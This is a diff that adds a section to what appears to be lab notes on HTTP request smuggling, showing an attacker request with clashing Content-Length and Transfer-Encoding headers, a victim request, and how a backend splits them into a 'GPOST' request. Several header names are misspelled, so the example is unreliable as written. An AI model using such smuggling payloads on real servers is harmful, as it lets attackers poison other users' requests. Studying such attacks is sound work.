@@ -112,5 +112,47 @@ Step 1. Find the correct Content-length
 
 Step 2. Verify the Transfer-Encoding `0` in the request is correct!
 
+---
+
+## Attack for web-app 1:
+
+Attacker request:
+```yaml
+POST / HTTP/1.1
+Host: localhost
+Content-lenght: 6
+Tranfer-Encoding : chunked
+
+0
+
+G
+```
+
+victim request:
+```yaml
+POST / HTTP/1.1
+Host: localhost
+Content-lenght: 0
+
+```
+
+## Backend parsing:
+the backend will parse the request's as:
+```yaml
+POST / HTTP/1.1
+Host: localhost
+Content-lenght: 6
+Tranfer-Encoding : chunked
+
+0
+```
+and 
+```yaml
+GPOST / HTTP/1.1
+Host: localhost
+Content-length: 0
+```
+and return method not found to the victim!
+
 
 
